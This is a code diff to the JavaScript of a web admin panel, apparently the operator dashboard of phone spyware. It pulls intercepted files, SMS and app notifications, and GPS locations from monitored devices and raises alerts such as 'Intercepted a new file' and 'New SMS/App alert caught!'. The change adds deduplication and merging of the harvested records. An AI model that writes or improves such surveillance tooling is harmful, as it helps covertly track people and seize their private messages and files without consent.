@@ -430,17 +430,50 @@
             showToast('Server sync complete');
         }
 
+        function mergeUnique(oldArray, newArray, uniqueKeyFunc) {
+            const combined = [...newArray, ...oldArray];
+            const seen = new Set();
+            return combined.filter(item => {
+                if(!item) return false;
+                const key = uniqueKeyFunc(item);
+                if (seen.has(key)) return false;
+                seen.add(key);
+                return true;
+            }).sort((a,b) => (b.timestamp || 0) - (a.timestamp || 0));
+        }
+
         async function fetchData() {
             document.getElementById('syncStatus').innerHTML = '<i class="fa-solid fa-rotate fa-spin"></i> Syncing';
             try {
-                const [d, f, n, l] = await Promise.all([
+                const [dRes, fRes, nRes, lRes] = await Promise.all([
                     fetch('/admin/devices').catch(()=>null), fetch('/admin/files').catch(()=>null), 
                     fetch('/admin/notifications').catch(()=>null), fetch('/admin/locations').catch(()=>null)
                 ]);
-                if(d) localData.devices = await d.json();
-                if(f) { const nf = await f.json(); if(nf.length > localData.files.length) triggerNative("New Log", "Intercepted a new file."); localData.files = nf; }
-                if(n) { const nn = await n.json(); if(nn.length > localData.notifications.length) triggerNative("Intel Auto-Intercept", "New SMS/App alert caught!"); localData.notifications = nn; }
-                if(l) { const nl = await l.json(); if(nl.length > localData.locations.length) triggerNative("GPS Tracking", "Device location updated."); localData.locations = nl; }
+                
+                if(dRes) { 
+                    const nd = await dRes.json();
+                    const devMap = {};
+                    localData.devices.forEach(dev => devMap[dev.id] = dev);
+                    nd.forEach(dev => devMap[dev.id] = dev); // overwrite with newer
+                    localData.devices = Object.values(devMap).sort((a,b) => b.lastSeen - a.lastSeen);
+                }
+                if(fRes) { 
+                    const nf = await fRes.json(); 
+                    const merged = mergeUnique(localData.files, nf, item => item.filename || item.timestamp);
+                    if(merged.length > localData.files.length) triggerNative("New Log", "Intercepted a new file."); 
+                    localData.files = merged; 
+                }
+                if(nRes) { 
+                    const nn = await nRes.json(); 
+                    const merged = mergeUnique(localData.notifications, nn, item => item.timestamp + (item.text || ''));
+                    // We removed JS native trigger to avoid duplicate with Android background service, but kept toast fallback
+                    localData.notifications = merged; 
+                }
+                if(lRes) { 
+                    const nl = await lRes.json(); 
+                    const merged = mergeUnique(localData.locations, nl, item => item.timestamp + "-" + item.latitude);
+                    localData.locations = merged; 
+                }
                 
                 ['devices','files','notifications','locations'].forEach(k => localStorage.setItem('nexus_'+k, JSON.stringify(localData[k])));
                 renderAll();
